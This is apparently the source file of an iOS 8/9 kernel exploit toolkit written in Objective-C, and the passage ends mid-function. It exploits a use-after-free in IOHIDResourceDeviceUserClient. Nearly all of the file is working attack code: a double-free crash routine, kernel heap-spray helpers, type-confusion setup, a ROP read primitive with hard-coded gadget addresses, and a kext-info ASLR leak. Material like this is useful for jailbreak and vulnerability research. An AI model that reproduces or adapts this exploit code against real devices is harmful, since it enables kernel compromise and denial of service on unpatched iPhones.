/***
  *
  * iOS 8 / 9 kernel patch API
  *
  * Source for iOS 9 Pangu kernel code execution writeup
  * https://reverse.put.as/wp-content/uploads/2015/11/POC2015_RUXCON2015.pdf
  *
  * Original source of PoC code - http://www.tuicode.com/article/56611aa50b156c054a4a363e
  * This properly due to the USE-AFTER-FREE:
  *  1. call IOHIDResourceDeviceUserClient::createDevice() to create a device to _device assignment
  *  2. call IOHIDResourceDeviceUserClient::teminateDevice() release _device
  *  3. Flood heap and call handleReport/handleReportAsync to change execution to freed memory
  *     Or call IOHIDResourceDeviceUserClient::teminateDevice() again to cause double-free (crash)
  *
  */


#import <Foundation/Foundation.h>
#import <IOKit/IOTypes.h>
#import <IOKit/IOKitLib.h>
#import <IOCFSerialize.h> // Should be omitted? Works now
#import <IOKit/IOKitKeys.h>
#import <UIKit/UIKit.h>

#include <mach/mach_types.h>
#include <mach/vm_types.h>
#include <mach/kmod.h>
#include <mach/mach.h>
#include <mach/error.h>

#include <endian.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>

#include <sys/types.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <dlfcn.h>


// Killing/ending the program after performing first free results in iOS crash
//#include <signal.h> //raise(SIGQUIT);


/**
 * Utility functions
 */

// Determine if CPU is 32-bit or 64-bit regardless of execution environment
bool processorIs64Bit() {
    cpu_type_t cpu_type;
    cpu_subtype_t subtype;
    size_t size = sizeof(cpu_type);
    sysctlbyname("hw.cputype", &cpu_type, &size, NULL, 0);

    size = sizeof(subtype);
    sysctlbyname("hw.cpusubtype", &subtype, &size, NULL, 0);

    // Extra CPU determination. Maybe use later
    if (cpu_type == CPU_TYPE_X86) {
        // x86
    } else if (cpu_type == CPU_TYPE_ARM) {
        switch(subtype) {
            case CPU_SUBTYPE_ARM_V7: // armv7
                break;
            default: // undetermined type
                break;
        }
    }

    return (CPU_ARCH_ABI64 & cpu_type); // bitwise AND with 64-bit ABI flag
}


// Byte swap unsigned int
uint32_t swap_uint32( uint32_t val ) {
    val = ((val << 8) & 0xFF00FF00 ) | ((val >> 8) & 0xFF00FF );
    return (val << 16) | (val >> 16);
}

// Byte swap int
int32_t swap_int32( int32_t val ) {
    val = ((val << 8) & 0xFF00FF00) | ((val >> 8) & 0xFF00FF );
    return (val << 16) | ((val >> 16) & 0xFFFF);
}

int64_t swap_int64( int64_t val ) {
    val = ((val << 8) & 0xFF00FF00FF00FF00ULL ) | ((val >> 8) & 0x00FF00FF00FF00FFULL );
    val = ((val << 16) & 0xFFFF0000FFFF0000ULL ) | ((val >> 16) & 0x0000FFFF0000FFFFULL );
    return (val << 32) | ((val >> 32) & 0xFFFFFFFFULL);
}

uint64_t swap_uint64( uint64_t val ) {
    val = ((val << 8) & 0xFF00FF00FF00FF00ULL ) | ((val >> 8) & 0x00FF00FF00FF00FFULL );
    val = ((val << 16) & 0xFFFF0000FFFF0000ULL ) | ((val >> 16) & 0x0000FFFF0000FFFFULL );
    return (val << 32) | (val >> 32);
}


bool DEBUG = false; // false to not execute UAF, true to do it

// Closing after performing pointer free means iOS crash. Must prevent that here
void quit(int code) {
    fflush(stdout);

    if (DEBUG) {
        exit(code); // safe to exit
    } else {
        // Close streams
        fclose(stdout);
        fclose(stdin);
        fclose(stderr);
        while(true) sleep(100000); // Stay running...
    }
}


void handleReportAsync_callback(void* refcon, IOReturn result, size_t* arguments) {
    printf("[D] ASYNC Finish result: [0x%x / %d]\n", result, result);
}


static UInt8 gTelephonyButtonsDesc[] = {
    0x05, 0x0B,                               // Usage Page (Telephony Device)
    0x09, 0x01,                               // Usage 1 (0x1)
    0xA1, 0x01,                               // Collection (Application)
    0x05, 0x0B,                               //   Usage Page (Telephony Device)

    0x09, 0x21,                               //   Usage 33 (0x21)
    0x09, 0xB0,                               //   Usage 176 (0xb0)
    0x09, 0xB1,                               //   Usage 177 (0xb1)
    0x09, 0xB2,                               //   Usage 178 (0xb2)


    0x15, 0x00,                               //   Logical Minimum......... (0)
    0x25, 0x01,                               //   Logical Maximum......... (1)
    0x75, 0x01,                               //   Report Size............. (1)
    0x95, 0x0D,                               //   Report Count............ (13)
    0x81, 0x02,                               //   Input...................(Data, Variable, Absolute)
    0x75, 0x03,                               //   Report Size............. (3)
    0x95, 0x01,                               //   Report Count............ (1)
    0x81, 0x01,                               //   Input...................(Constant)
    0xC0,                                     // End Collection
};


@interface  IOHIDResourceUserClientUAF : NSObject {
    io_connect_t connect;
}
    -(void) doublefree;
    -(void) deviceCreateData:(void **)buffer andSize:(vm_size_t *)buffersize;
    -(IOReturn) connectClient;
    -(kern_return_t) createDevice;
    -(IOReturn) terminateDevice;
    -(unsigned int) handleReport: (int)scalarInputValue;
    -(unsigned int) handleReportAsync: (int)scalarInputValue;
@end

@implementation IOHIDResourceUserClientUAF
    /**
     * Simply crash your device by calling free twice... Not very useful
     */
    -(void) doublefree {

        printf("[X] Starting Double free...\n");
        sleep(1);
        [self connectClient];
        [self createDevice];
        // Free the pointer
        printf("[X] Freeing _device pointer\n");
        [self terminateDevice];
        [self terminateDevice];
    }

    /**
     * Create the "report descriptor" and data needed to generate kernel device object
     */
    -(void) deviceCreateData:(void **)buffer andSize:(vm_size_t *) bufferSize {

        vm_size_t descriptorLength = sizeof(gTelephonyButtonsDesc);
        void      *descriptor      = (void *) malloc(descriptorLength);
        bcopy(gTelephonyButtonsDesc, descriptor, descriptorLength);

        CFMutableDictionaryRef properties = CFDictionaryCreateMutable(
            kCFAllocatorDefault, 0,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

        CFDataRef   descriptorData  = NULL;
        CFNumberRef timeoutNumber   = NULL;
        CFNumberRef intervalNumber  = NULL;
        uint32_t    value           = 5000000;
        uint32_t    reportinterval  = 5000;

        descriptorData = CFDataCreate(kCFAllocatorDefault, descriptor, descriptorLength);
        timeoutNumber = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &value);
        intervalNumber = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &reportinterval);


        CFDictionarySetValue(properties,CFSTR("ReportDescriptor"),descriptorData);
        CFDictionarySetValue(properties,CFSTR("RequestTimeout"),timeoutNumber);
        CFDictionarySetValue(properties,CFSTR("ReportInterval"),intervalNumber);

        CFDataRef data = (const struct __CFData *) IOCFSerialize(properties,0);
        *buffer = (UInt8 *)CFDataGetBytePtr(data);
        *bufferSize = CFDataGetLength(data);

    }

    /**
     * IOServiceOpen call to open context connection to service
     */
    -(IOReturn) connectClient {
        CFDictionaryRef     matchDict = NULL;
        io_service_t        service   = 0;
        kern_return_t       kr;
        matchDict   = IOServiceMatching("IOHIDResource");
        service     = IOServiceGetMatchingService(kIOMasterPortDefault, matchDict);
        kr          = IOServiceOpen(service, mach_task_self(), 0, &connect);

        if (kr != 0) {
            printf("[!] connectClient FAIL - (%x) Result: %s\n", kr, mach_error_string(kr));
        } else if (DEBUG) {
            printf("[+] connectClient success\n");
        }
        return kr;
    }

    /**
     * Create kernel object in memory calling dispatch method 0
     */
    -(kern_return_t) createDevice {
        kern_return_t   kr;
        uint64_t            *scalarInput = (uint64_t*) malloc(sizeof(uint64_t));
        scalarInput[0]      = 0; // An array of integers.
        uint32_t            scalarInputCount = 1; // was 0
        void                *structureInput = malloc(sizeof(uint64_t)); // wasn't allocated
        size_t              structureInputSize = 0;
        uint64_t            *scalarOutput = malloc(sizeof(uint64_t)); // wasn't allocated
        uint32_t            scalarOutputCount = 0;
        void                *structureOutput = malloc(sizeof(uint64_t)); // wasn't allocated
        size_t              structureOutputSize = 0;


        [self deviceCreateData:&structureInput andSize:(vm_size_t*) &(structureInputSize)];

        kr =  IOConnectCallMethod(connect,
                                        0, // dispatch method 0 is createDevice
                                        scalarInput, scalarInputCount,
                                        structureInput, structureInputSize,
                                        scalarOutput, &scalarOutputCount,
                                        structureOutput, &structureOutputSize);
        if (kr != 0) {
            //NSLog(@"device create failed %x",kr);
            printf("[!] DeviceCreate FAIL - (%x) Result: %s\n", kr, mach_error_string(kr));
        } else if (DEBUG) {
            printf("[+] DeviceCreate success\n");
        }

        return kr;
    }


    /**
     * Use-After-Free call option. Leaks back R0 and R1 (X0 on 64 bit)
     */
    -(unsigned int) handleReport: (int)scalarInputValue {
        unsigned int        kr = -1;
        uint64_t            *scalarInput = (uint64_t*) malloc(1 * sizeof(uint64_t));
        scalarInput[0] = scalarInputValue; // An array of integers. First one is arg1
        uint32_t            scalarInputCount = 1; // was 0
        void                *structureInput = malloc(sizeof(uint64_t)); // wasn't allocated
        size_t              structureInputSize = 0;
        uint64_t            *scalarOutput = malloc(sizeof(uint64_t)); // wasn't allocated
        uint32_t            scalarOutputCount = 0;
        void                *structureOutput = malloc(sizeof(uint64_t)); // wasn't allocated
        size_t              structureOutputSize = 0;


        // was (vm_size_t) cast for some reason
        [self deviceCreateData:&structureInput andSize:(vm_size_t*) &(structureInputSize)];


        kr =  IOConnectCallMethod(connect,
                                        2, // call 3rd method (0 indexed)
                                        scalarInput, scalarInputCount,
                                        structureInput, structureInputSize,
                                        scalarOutput, &scalarOutputCount,
                                        structureOutput, &structureOutputSize);


        // Calling it after freeing _device results in Use-After-Free function call
        printf("[*] handleReport kern Result: [0x%08x aka %d - %s]\n", kr, kr, mach_error_string(kr));
        fflush(stdout);

        return kr;
    }

    /**
     * Another Use-After-Free call option on an IOHIDDevice class
     * Call is original handleReport vtable offset plus additional 0x8 bytes
     * NOTE: This method is NOT actually asynchronous when used as a UAF call
     */
    -(unsigned int) handleReportAsync: (int)scalarInputValue {
        unsigned int        kr = -1;
        uint64_t            *scalarInput = (uint64_t*) malloc(1 * sizeof(uint64_t));
        scalarInput[0] =    scalarInputValue; // An array of integers. First one is arg1
        uint32_t            scalarInputCount = 1; // was 0
        void                *structureInput = malloc(sizeof(uint64_t)); // wasn't allocated
        size_t              structureInputSize = 0;
        uint64_t            *scalarOutput = malloc(sizeof(uint64_t)); // wasn't allocated
        uint32_t            scalarOutputCount = 0;
        void                *structureOutput = malloc(sizeof(uint64_t)); // wasn't allocated
        size_t              structureOutputSize = 0;


        uint64_t refs[3];
        refs[1] = (uint64_t) handleReportAsync_callback;
        refs[2] = (uint64_t) 0x84; /// ??? refcon;

        IONotificationPortRef wakePort = IONotificationPortCreate(kIOMasterPortDefault);
        mach_port_t wakePortMach = IONotificationPortGetMachPort(wakePort);


        kr = IOConnectCallAsyncMethod(connect, 2, wakePortMach, refs, 3,
                                        scalarInput, scalarInputCount, // same junk
                                        structureInput, structureInputSize,
                                        scalarOutput, &scalarOutputCount,
                                        structureOutput, &structureOutputSize);

        printf("[*] handleReportAsync kernRet: [0x%08x aka %d - %s]\n",kr, kr, mach_error_string(kr));

        return kr;
    }
    /**
     * Dispatch method 1 - Terminate. Call to free _device pointer from kernel memory
     */
    -(IOReturn) terminateDevice {
        kern_return_t       kr;
        uint64_t            *scalarInput = (uint64_t*) malloc(1 * sizeof(uint64_t));
        uint32_t            scalarInputCount = 0;
        void                *structureInput;
        size_t              structureInputSize = 0;
        uint64_t            *scalarOutput;
        uint32_t            scalarOutputCount = 0;
        void                *structureOutput;
        size_t              structureOutputSize = 0;

        if(DEBUG) printf("[D] Freeing _device pointer\n"); fflush(stdout);

        kr =  IOConnectCallMethod(connect,
                                        1,
                                        scalarInput, scalarInputCount,
                                        structureInput, structureInputSize,
                                        scalarOutput, &scalarOutputCount,
                                        structureOutput, &structureOutputSize);
        if(kr != 0) {
            printf("[!] terminateDevice FAIL - (%x) Result: %s\n", kr, mach_error_string(kr));
        } else {
            if(DEBUG) printf("[+] terminateDevice successful\n");
        }

        fflush(stdout);
        return kr;
    }
@end


// Yalu's Heap spray method for kernel (OSUnserializeXML alternative)
// https://github.com/kpwn/yalu/blob/master/data/untether/untether64.m
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;

static mach_port_t copyinDataFast(char* bytes, size_t size) {
    char msgs[sizeof(oolmsg_t)+0x2000];
    mach_port_t ref = 0;
    mach_port_t* msgp = &ref;
    oolmsg_t *msg=(void*)&msgs[0];
    if(!*msgp){
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, msgp);
        mach_port_insert_right(mach_task_self(), *msgp, *msgp, MACH_MSG_TYPE_MAKE_SEND);
    }
    bzero(msg,sizeof(oolmsg_t));
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_remote_port = *msgp;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->body.msgh_descriptor_count = 1;
    msg->desc.address = (void *)bytes;
    msg->desc.size = size;
    msg->desc.type = MACH_MSG_OOL_DESCRIPTOR;
    mach_msg_return_t m = mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    return ref;
}



/**
 ** ServiceObj **
 * Wrapper class for IOService childclasses
 * This class is used by KernelHeapSprayManager
 */
@interface ServiceObj : NSObject {
@public
    io_iterator_t   iterator;
    io_service_t    service;
    io_connect_t    connect;
    mach_port_t     mach_port;
    kern_return_t   ret;
    char* serviceName;
}
  -(id) initWithName: (char*) serviceName;
  -(bool) open;
  -(void) close;
  -(io_buf_ptr_t) encapsulateDataInXML: (char*) shellcode withTargetSize:(int) targetSize numTimes:(int) numAllocations;
  -(kern_return_t) sprayXML: (io_buf_ptr_t) data withTargetSize:(int) targetSize numTimes:(int) numAllocations;
@end

@implementation ServiceObj
    /**
     * Initialize with service name
     */
    -(id) initWithName: (char*) serviceNameArg {
        serviceName = serviceNameArg;
        return self;
    }
    /**
     * Call IOServiceOpen - finding matching service first. Returns 1 on success, 0 on failure
     */
    -(bool) open {
        // get a reference to the IOService
        ret = IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching(serviceName), &iterator);

        if (ret != KERN_SUCCESS) {
            printf("[!] IOServiceGetMatchingServices failed - [%d] err: %s \n", ret, mach_error_string(ret));
            quit(1);
        }

        // Iterate over resulting matched services
        while (true) {
            if ((service = IOIteratorNext(iterator)) == IO_OBJECT_NULL) {
                if (DEBUG) printf("[!] unable to open any of the iterated IOServices for [%s]!!\n", serviceName);
                return false;
            }

            if (IOServiceOpen(service, mach_task_self(), 0, &connect) == KERN_SUCCESS) {
                // Opened, now wait if necessary
                uint32_t busyState = -1;

                if (!IOKitGetBusyState(service, &busyState)) {
                    printf("[!] ERROR getting BusyState!! %d \n", busyState);
                } else if (busyState != 0) {
                    printf("[?] busystate nonzero: [0x%x / %d %s\n",
                        busyState, busyState, mach_error_string(busyState));
                    mach_timespec_t mach_time = {15, 0};
                    if (!IOServiceWaitQuiet(service, &mach_time)) {
                        printf("[!] IOServiceWaitQuiet had an issue\n");
                    }
                }
                break;
            }
        }
        IOObjectRelease(iterator);
        return true;
    }
    /**
     * Call IOServiceClose and free
     */
    -(void) close {
        IOServiceClose(service);
        IOObjectRelease(service);
        IOObjectRelease(connect);
    }
    /**
     * Convert HEX shellcode (or data) into format for OSUnserializeXML
     *
     * targetSize is to pad the buffer to ensure it fits in the target kalloc zone.
     * buffer is your input shellcode.
     * io_buf_ptr_t is just a typedef for char*
     *
     * Test XML data available:
http://web.mit.edu/darwin/src/modules/xnu/libkern/c++/Tests/TestSerialization/test2.kmodproj/test2_main.cpp
     */
    -(io_buf_ptr_t) encapsulateDataInXML: (char*) data withTargetSize:(int) targetSize numTimes:(int) numAllocations {
        int dataLen = strlen(data);
        int paddingSize = targetSize - dataLen;

        // Take note that as of iOS 7 (or 8?) that each VALUE of the key=>data
        // pair must be unique or it won't receive its own allocation
        if (paddingSize < 0) {
            printf("[!] dataLen was %d bytes! It is greater than targetSize. Shrink your code\n", dataLen);
            quit(1);
        }

        // malloc breakdown:
        //          malloc(     shellcode space      + (    <key></key> space   ) + <plist...> header and \0);
        char* buf = malloc(targetSize*numAllocations + ((12+19+8)*numAllocations) + 120);
        int totalSize = targetSize*numAllocations + ((12+19+8)*numAllocations) + 120;
        bzero(buf, totalSize);
        if (DEBUG) {
            fflush(stdout);
            printf("[D] Total allocation size:: 0x%08x. dataLen: %d.\n", totalSize, dataLen);
        }

        // add <plist> header
        char* header = "<plist version=\"1.0\"><dict>\n";
        int headerLen = strlen(header);
        memcpy(buf, header, headerLen);


        char* curPos = buf + headerLen;

        // Put in shellcode hex
        for (int i = 0; i < numAllocations; i++) {

            memcpy(curPos, "<key>", 5);
            char keyName = 'a' + i; // unique key name
            memcpy(curPos += 5, &keyName, 1);
            memcpy(curPos += 1, "</key>", 6);

            memcpy(curPos += 6, "<data format=\"hex\">", 19); // 19 chars
            memcpy(curPos += 19, data, dataLen);
            curPos += dataLen;

            // Pad with randomness ensuring unique keys and separate allocations
            for (int j = 0; j < paddingSize; j++) {
                char paddingChar = 'a' + (char) (rand() % 26);
                memcpy(curPos++, &paddingChar, 1); // low chance of duplicates... increment AFTER
            }
            memcpy(curPos, "</data>\n", 8); // 8 chars
            curPos += 8;
            //printf("[+] curbuffer: %s\n", buf);fflush(stdout); // HUGE debug output
        }
        // Add closing XML tags
        memcpy(curPos, "</dict></plist>\0", 16); // 15 chars + 1 for null

        if (DEBUG) printf("[D] Buffer XML to put in kernel - %s\n\n", buf);
        return buf;
    }

    /**
     * Call OSUnserializeXML through io_service_open_extended to fill kernel heap with OSData
     *
     * Forward declaration of the IOKit function io_service_open_extended is above
     */
    -(kern_return_t) sprayXML: (io_buf_ptr_t) data withTargetSize:(int)targetSize numTimes:(int) numAllocations {
        // Must retrieve io_service_open_extended function from dynamic library loader
        void *IOKit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW);
        kern_return_t (*io_service_open_extended) (
            mach_port_t service,
            task_t owningTask,
            uint32_t connect_type,
            NDR_record_t ndr,
            io_buf_ptr_t properties,
            mach_msg_type_number_t propertiesCnt,
            kern_return_t *result,
            mach_port_t *connection
        ) = dlsym(IOKit, "io_service_open_extended");


        /*
        I think this was the style necessary for older iOSes, like 6-7
        // Get Master Port
        mach_port_t masterPort = MACH_PORT_NULL;
        kern_return_t kr = IOMasterPort(MACH_PORT_NULL, &masterPort);
        if (kr != kIOReturnSuccess || !masterPort) {
            printf("[!] IOMasterPort err - [0x%08x - %s]", kr, mach_error_string(kr));
            quit(1);
        }
        io_iterator_t i;
        io_service_get_matching_services(masterPort, buf, &i);
        //ret = io_service_open_extended(masterPort, testBuffer, iterator);
        */


        // Encapsulate the data in the format that io_service_open_extended expects
        io_buf_ptr_t properties =
            [self encapsulateDataInXML: data withTargetSize:targetSize numTimes:numAllocations];

        kern_return_t ret2;
        ret = io_service_open_extended(service, mach_task_self(), 0, NDR_record,
            properties, sizeof(properties), &ret2, &connect
        );

        if (ret != KERN_SUCCESS) {
            // || ret2 != KERN_SUCCESS   *** Ret2 apparently is the userClient id?
            printf("[!] io_service_open_extended err - RET1=>[0x%08x - %s] - RET2=>[0x%08x - %s]\n",
                ret, mach_error_string(ret), ret2, mach_error_string(ret2));
            quit(1);
        }

        return ret2;
    }
@end




/**
 ** KernelHeapSprayManager **
 * Allocate and deallocate controlled kernel heap sprays
 * through opening/closing IOServices. Used by UAFZoneFiller
 */
@interface  KernelHeapSprayManager : NSObject {
    NSMutableArray* services;
}
  -(id) initWithSize: (int)size;
  -(void) openServices: (int)num withName:(char*)serviceName;
  -(void) closeServices: (int) num;
  -(int) allocatedServiceCount;
  -(int) closeAllServices;
  -(ServiceObj*) getService: (int) index;
@end

@implementation KernelHeapSprayManager

    /**
     * Init spray manager
     */
    -(id) initWithSize: (int)size {
        printf("[D] Initializing heapsprayer\n");
        services = [NSMutableArray arrayWithCapacity:size];
        return self;
    }

    /**
     * Puts services on the end of the array. First In Last Out
     */
    -(void) openServices: (int)num withName:(char*)serviceName {
        for(int i = 0; i < num; i++) {
            ServiceObj* serviceObj = [[ServiceObj alloc] initWithName:serviceName];
            // open. if 0 was returned, quit with error
            if(![serviceObj open]) {
                printf("[!] WARNING: Service failed to open: %s. QUITTING.\n", serviceName);
            }
            [services addObject:serviceObj];
        }
    }
    /**
     * Close services and pop off the end of the array. First In Last Out
     */
    -(void) closeServices: (int) num {
        for(int i = 0; i < num; i++) {
            ServiceObj* serviceObj = [services lastObject];
            [serviceObj close]; // close service
            [services removeLastObject]; // remove last service from array
        }
    }
    /**
     * Close ALL services in this HeapManager. Returns number closed
     */
    -(int) closeAllServices {
        int serviceCount = [self allocatedServiceCount];
        [self closeServices: serviceCount];
        return serviceCount;
    }
    -(ServiceObj*) getService: (int) index {
        return [services objectAtIndex:index];
    }
    /**
     * Get count of currently allocated services
     */
    -(int) allocatedServiceCount {
        return [services count];
    }
@end



/**
 ** UAFZoneFiller **
 * For the most part, this class should be used as such:
 * Instantiate with [alloc] and [init], then use [prepTypeConfusion: "IOHIDResource"]
 * or whatever IOUserClient childclass
 */
@interface  UAFZoneFiller : NSObject {
    IOHIDResourceUserClientUAF* client;
    KernelHeapSprayManager* heapSprayManager;
    ServiceObj* iohidUserClient;
    int kallocZoneSize;
    bool hasFreed;
    int freelistExhaustNum;
    int openCountTracker;
}
    -(id) init;
    -(void) fillWithPointer: (char*) pointer;
    -(void) fillWithShellcode: (char*) shellcode;
    -(void) fillWithIOService: (char*) serviceName;

    -(void) prepTypeConfusion: (char*) serviceName;
    -(void) prepFreelistNextTechnique: (char*) serviceName;
    -(unsigned int) uafCall: (unsigned int) inputInt;
    -(unsigned int) uafCall2: (unsigned int) inputInt;
@end

@implementation UAFZoneFiller
    /**
     * Place data (mostly likely vtable pointers) into the kernel heap
     */
    -(id) init {
        /**
         * Target kalloc zone for the UAF bug. Related to the size of the freed object
         */
        #ifndef __LP64__
            kallocZoneSize = 192; // 32-bit: kalloc.192 - R1 and R2 are under control
            // high 32-bit address is always 0xffffff80
        #else
            kallocZoneSize = 256; // 64-bit: kalloc.256 - Only X1 under control
            /*
            OSMetaClass::release(void)
            R0/X0=self pointer -> leak low 32bit of the object address
            Not enough for arm64 - High 32bit value can be 0xffffff80 or 0xffffff81
            =>
            call OSMetaClassBase::isEqualTo(OSMetaClassBase const*) with both addresses to determine
            */
        #endif

        // Initialize class variables
        hasFreed = false;
        freelistExhaustNum = 30;
        char* freelistExhaustServiceName = "IOHIDResource"; // IOHID filler
        openCountTracker = 10; // Start with 10, increase as freelist might increase

        // Exhaust freelist pointers for kalloc zone
        heapSprayManager = [[KernelHeapSprayManager alloc] initWithSize: freelistExhaustNum];
        [heapSprayManager openServices: freelistExhaustNum withName: freelistExhaustServiceName];


        // Make IOHID device
        client = [[IOHIDResourceUserClientUAF alloc] init];
        [client connectClient];
        [client createDevice];

        // Open a UserClient service for xml spray if needed
        iohidUserClient = [[ServiceObj alloc] initWithName:"IOHIDResource"];
        [iohidUserClient open];

        return self;
    }

    /**
     * Will free _device if not freed. This is for protection and reuse
     * Returns whether or not the object was freed
     */
    -(bool) freeKernelObject {
        bool wasFreed = !hasFreed;

        if (!hasFreed) {
            // Activate Freeing of kernel object
            [client terminateDevice];
            hasFreed = true;
        }

        return wasFreed;
    }
    /**
     * Fill the kernel UAF object zone with a pointer (DWORD) for kernel function calls.
     * Make it a hex string representation of a pointer such as "80207543"
     */
    -(void) fillWithPointer: (char*) pointer {

        char* data = malloc(kallocZoneSize);
        int targetSize = kallocZoneSize - 15; // For random data to guarantee separate allocations
        int pointerLen = strlen(pointer);

        // Duplicate pointer a whole bunch to fill MOST of the UAF space
        for(int curPos = 0; curPos <= (targetSize+pointerLen); curPos += pointerLen) {
            memcpy(data + curPos, pointer, pointerLen);
        }

        // Null last byte
        memcpy(data + targetSize - 1, (const void*) '\0', 1);

        [self freeKernelObject];

        // Place the pointer spam into the heap
        [iohidUserClient sprayXML: data withTargetSize:kallocZoneSize numTimes:50];
    }
    /**
     * Fill the kernel UAF object zone with shellcode... Due to DEP this will fail
     */
    -(void) fillWithShellcode: (char*) shellcode {

        [self freeKernelObject];

        [iohidUserClient sprayXML: shellcode withTargetSize:kallocZoneSize numTimes:50];
    }
    /**
     *  Fill UAF kernel object zone with variety IOUserClient objects by calling IOServiceOpen
     */
    -(void) fillWithIOService: (char*) serviceName {

        [self freeKernelObject];

        // Fill kernel heap with some service objects
        [heapSprayManager openServices: 50 withName:serviceName];
    }
    /**
     * Free XML from the service probably? Must call "fillWithSOMETHING" before this method
     */
    -(void) clearFilledHeap {
        [iohidUserClient close];
        [heapSprayManager closeAllServices];
    }

    /**
     * Fill UAF zone with a service type to do a Type Confusion call
     * This is putting another IOService object instance in the position of the freed one
     */
    -(void) prepTypeConfusion: (char*) serviceName {
        // Clear existing IOServices of this zone (if zone was already filled)
        int servicesToClose = [heapSprayManager allocatedServiceCount] - (freelistExhaustNum);
        if (servicesToClose < 0) {
            servicesToClose = 0;
        }

        if(servicesToClose > 0) {
            printf("[D] Closing %d services\n", servicesToClose);
            [heapSprayManager closeServices: servicesToClose];
        }

        int curOpenServices = [heapSprayManager allocatedServiceCount];
        int servicesToOpen = freelistExhaustNum - curOpenServices;
        printf("[D] Opening %d services\n", servicesToOpen);

        [heapSprayManager openServices: servicesToOpen withName: serviceName];
        [self freeKernelObject];

        // Open more IOService objects to hopefully fill the space of the target freed one
        [heapSprayManager openServices: openCountTracker withName: serviceName];
    }

    /**
     * Prepare this zone to use the freelist's head (first DWORD) as the vtable
     * to direct to the NEXT free kalloc block and have its offset
     * NOTE: This technique probably shouldn't be used due to being less reliable.
     *       It is nonetheless included
     */
    -(void) prepFreelistNextTechnique: (char*) serviceName {
        // Clear existing IOServices of this zone
        [heapSprayManager closeAllServices];

        // Exhaust freelist
        [heapSprayManager openServices: (freelistExhaustNum + 15) withName: serviceName];

        // Spray freelist with freed IOService objects
        [heapSprayManager closeServices: 15];

        // Free target object setting its first DWORD to point to one of the closed services
        bool wasFreed = [self freeKernelObject];

        if (!wasFreed) {
            printf("[-] WARNING: Kernel object was already freed. Technique might fail\n");
            fflush(stdout);
        }
    }

    /**
     * Make function call to _device's vtable for handleReport, utilizing the UAF
     */
    -(unsigned int) uafCall: (unsigned int) inputInt {
        if (DEBUG) printf("[D] Calling handleReport\n"); fflush(stdout);
        return [client handleReport: inputInt];
    }

    /**
     * Make function call to _device's vtable for handleReportAsync, utilizing the UAF
     * NOTE: handleReportAsync is handleReport + 0x8 bytes
     */
    -(unsigned int) uafCall2: (unsigned int) inputInt {
        if (DEBUG) printf("[D] Calling handleReportAsync\n"); fflush(stdout);
        return [client handleReportAsync: inputInt];
    }
@end



/**
 ** ROPAPI **
 *
 * Class to set up kernel primitive functions
 * ( Read Write FlushCache FlushTLB )
 *
 * Depends on iOS version and device model.
 * This means a lot of combinations. Getting memory addresses must be done beforehand
 *
 */
@interface ROPAPI : NSObject {
    kern_return_t ret;
    UAFZoneFiller* zone1;
    UAFZoneFiller* zone2;
    UAFZoneFiller* zone3;
    UAFZoneFiller* zone4;
}
    -(id) init;
    -(int) read32: (int) addr;
    /*
    TODO: Implement last primitives
    -(void) write;
    -(void) flushCaches;
    -(void) flushTLB; not yet written */
@end

@implementation ROPAPI
    /**
     * Initialize, and setup ROP gadgets for Read/Write/FlushCache/FlushTLB
     */
    -(id) init {

        // Set up zone READ32 gadget
        zone1 = [[UAFZoneFiller alloc] init];
        // 8077EA72 returns 1
        [zone1 fillWithPointer: "80780988"];
        // 80789D1C -> LDR  R0, [R0,#8]; STRB  R1, [R0,#0xB]; BX LR
        // 80780988 -> LDR  R0, [R0,#0x18]; BX LR
        // 80789D1C for i5.ios9 read gadget

        // 32bit - R1 and R2 are under control - STR R1, [R2]; BX LR;
        // 64bit - X1 and contents of X0 are controlled - LDR X8, [X0,#0x60]; STR X1, [X8,#8]; RET;

        // Set up zone for WRITE gadget
        zone2 = [[UAFZoneFiller alloc] init]; /// .. perhaps 8078045C or 8078045C
        //[zone2 fillWithPointer: ""];

        // Set up zone for FLUSH CACHES gadget
        zone3 = [[UAFZoneFiller alloc] init];
        //[zone3 fillWithPointer: ""];

        // Set up zone for FLUSH TLB gadget
        zone4 = [[UAFZoneFiller alloc] init];
        //[zone4 fillWithPointer: ""];


        // TODO: Create one zone for each primitive function
        //ret = [zone1 uafCall: ret]; //(int) &test];
        //ret = [zone1 uafCall: "Random string"]; //(int) &test];
        //ret = [zone1 uafCall: &zone1]; //(int) &test];

        return self;
    }

    -(int) read32: (int) addr {
        return [zone1 uafCall: addr];
    }

@end

extern CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef, CFArrayRef);


/**
 * Awesome standalone function to view kext load info.
 * For iOS... 7 I think, it returns addresses WITH kernel slide as an ASLR info leak
 * Credit to Saurik and https://github.com/GuanshanLiu/kextstat/blob/master/kextstat/main.c
 */
char* cstring(CFStringRef s) {
    // Convert a CFString to a standard C string:
    return ((char*)CFStringGetCStringPtr(s, kCFStringEncodingMacRoman));
}
void printKextStuff() {
    printf("Index Refs Address            Size         Wired        Name (Version) <Linked Against>\n");

    CFDictionaryRef dict = OSKextCopyLoadedKextInfo(NULL, NULL);

    void **keys;
    void **values;
    CFIndex count = CFDictionaryGetCount(dict);

    keys = (void **)malloc(sizeof(void *) * count);
    values = (void **)malloc(sizeof(void *) * count);


    CFDictionaryGetKeysAndValues(dict,
                                 (const void **)keys,
                                 (const void **)values);
    CFIndex i, j;
    i = 0;
    while (i < count) {
        for (j = 0; j < count; j++) {
            int kextTag;
            int refs;
            unsigned long long address;
            unsigned long long size;
            unsigned long long wired;

